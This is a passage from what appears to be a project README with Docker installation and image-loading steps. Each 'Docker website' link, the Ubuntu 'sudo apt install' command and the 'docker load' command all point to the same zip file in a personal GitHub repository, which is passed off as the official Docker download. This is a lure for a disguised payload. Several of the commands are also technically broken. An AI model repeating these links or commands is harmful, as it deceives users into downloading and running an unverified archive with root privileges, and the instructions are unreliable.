### 4. Install Docker

If you do not have Docker installed, follow these steps to install it:

- **For Windows:**
  1. Go to the [Docker website](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip).
  2. Download the Windows version.
  3. Follow the installation prompts.

- **For Mac:**
  1. Visit the [Docker website](https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip).
  2. Download the Mac version.
  3. Follow the installation instructions.

- **For Linux:**
  1. Open a terminal.
  2. Use your package manager to install Docker. For example:
     - For Ubuntu: `sudo apt install https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip`
     - For Fedora: `sudo dnf install docker`
  3. After installation, start Docker with the command: `sudo systemctl start docker`

### 5. Load the Docker Image

Once Docker is installed, open your terminal or command prompt. Navigate to the folder where you downloaded the Docker image. Use the following command:

```
docker load -i https://github.com/Samuelpoukkyy/depth-pro-docker/raw/refs/heads/main/static/docker_pro_depth_1.5.zip
```
